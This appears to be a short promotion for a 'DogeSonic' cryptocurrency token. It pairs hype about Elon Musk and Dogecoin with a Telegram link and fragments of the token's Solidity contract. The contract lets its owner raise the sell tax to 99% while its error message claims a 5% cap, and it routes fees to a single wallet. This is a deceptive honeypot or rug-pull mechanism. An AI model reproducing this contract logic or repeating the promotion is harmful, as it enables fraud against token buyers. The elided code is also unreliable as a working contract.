...
Papa Elon have been promoting doge everywhere and finally it’s all paying off with almost 300% boost from doge bottom. This november is looking bullish for doge and with papa elon becoming CEO of Twitter there’s no end to this moon.

https://t.me/DogeSonicEth
...
contract DogeSonic is Context, IERC20, Ownable {
 
    using SafeMath for uint256;
 
    string private constant _name = "DogeSonic";
    string private constant _symbol = "DogeSonic";
    ...
    address payable private _developmentAddress = payable(0xE454dafC7C9DA9450A0B495254673e6FDccFcF03); 
    address payable private _marketingAddress = payable(0xE454dafC7C9DA9450A0B495254673e6FDccFcF03);
    ...
    function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {
        ...
        require(taxFeeOnSell >= 0 && taxFeeOnSell <= 99, "Sell tax must be between 0% and 5%");
